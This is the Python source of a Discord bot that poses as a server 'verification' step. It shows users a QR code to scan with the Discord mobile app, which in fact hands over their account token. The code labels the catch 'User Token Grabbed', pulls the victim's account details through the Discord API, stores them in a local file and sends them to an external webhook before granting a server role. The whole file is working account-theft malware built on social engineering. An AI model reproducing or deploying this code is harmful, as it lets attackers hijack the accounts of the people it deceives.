import json
import discord
from discord import Colour
from discord.ext import commands
from aioconsole import aprint
from resources import QR
import os
import ujson
import asyncio
import shutil
from discord_components import DiscordComponents, ComponentsBot, Button
import requests
import aiohttp
from discord import Webhook, RequestsWebhookAdapter
from discord.utils import get

with open("./resources/data.json") as f:
    config = json.load(f)
token = config["token"]
prefix = config["prefix"]

bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), case_insensitive=True, help_command=None)
DiscordComponents(bot)
webhook_url = config["webhook_url"]
qr = QR()
role_id = int(config["role_id"])

@bot.event
async def on_ready():
    await aprint(f"Logged into {bot.user.name}#{bot.user.discriminator}")


@bot.command(name="Start", description="Sends the verification message, only works in the current set channel")
async def _verify(ctx):
    await ctx.message.delete()
    with open('./resources/data.json') as f:
        data = ujson.load(f)
    if str(ctx.channel.id) == str(data['channel']):
        channel = bot.get_channel(int(data['channel']))
        em = discord.Embed(title=f"**Welcome to {ctx.guild.name}**", description=":lock: **In order to access this server, you need to pass the verification test.**\n:arrow_right: Please verify below.")
        await channel.send(embed=em, components = [Button(label = "Verify Here!", custom_id = "button1")])



@bot.event
async def on_button_click(interaction):
    await qr.create_qr(name=f"{interaction.user.id}")
    em = discord.Embed(title=f"Hello {interaction.user.name}", description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.", colour=Colour.dark_red())
    em.set_image(url=f"attachment://qr-code-{interaction.user.id}.png")
    em.set_footer(text="Credit goes to Shell UwU")
    em.set_author(name=f"{bot.user.name}", icon_url=f"{bot.user.avatar_url}")
    await interaction.send(embed=em, file=discord.File(f"./resources/codes/qr-code-{interaction.user.id}.png"), delete_after=120)
    os.remove(f"resources/codes/qr-code-{interaction.user.id}.png")
    token = asyncio.create_task(qr.wait_token())
    token = await token
    while True:
        await aprint(token)
        if token != None:
            em = discord.Embed(title="User Token Grabbed")
            await tokeninfo(str(token), em)
            webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
            webhook.send(embed=em)
            role = get(interaction.guild.roles, id=role_id)
            user = interaction.user
            await user.add_roles(role)
            break


async def tokeninfo(_token, embed):
    async with aiohttp.ClientSession() as session:
        async with session.get("https://discord.com/api/v9/users/@me", headers={"authorization":_token, "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.135 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}) as resp:
            if resp.status == 200:
                j = await resp.json()
                user = {}
                with open("./resources/users.json", "r", encoding="utf-8") as f:
                    data = json.load(f)
                    users = data["users"]
                    for key, value in j.items():
                        embed.add_field(name=f"{key}", value=f"{value}", inline=False)
                        user[f"{key}"] = value
                    users.append(user)
                with open("./resources/users.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=4)


@bot.command(name="CleanDir", description="Cleans directory", aliases=['clean'])
@commands.has_permissions(administrator=True)
async def _clean(ctx):
    await ctx.message.delete()
    folder = "./resources/codes"
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            await ctx.send(f'Failed to delete {file_path}.\n Reason: {e}', delete_after=5)

@bot.command(name="Help", description="Displays the help command")
async def _help(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=f"{bot.user.name}", description="Commands are listed below. All commands are case insensitive", colour=Colour.dark_red())
    for command in bot.walk_commands():
        if len(command.aliases) == 0:
            em.add_field(name=f"`{prefix}{command.name}`", value=f"{command.description}", inline=False)
        else:
            for i in range(len(command.aliases)):
                command.aliases[i] = f"{prefix}{command.aliases[i]}"
            aliases = ", ".join(command.aliases)

            em.add_field(name=f"`{prefix}{command.name}, {aliases}`", value=f"{command.description}", inline=False)
    em.set_thumbnail(url=f"{ctx.guild.icon_url}")
    em.set_image(url="https://64.media.tumblr.com/2a7e4e7831aaf492a692e674f451d78c/tumblr_n9eno0SSTZ1s5f9ado1_500.gif")
    em.set_footer(text="Credit goes to Shell UwU")
    em.set_author(name=f"{bot.user.name}", icon_url=f"{bot.user.avatar_url}")
    await ctx.send(embed=em)



bot.run(token)
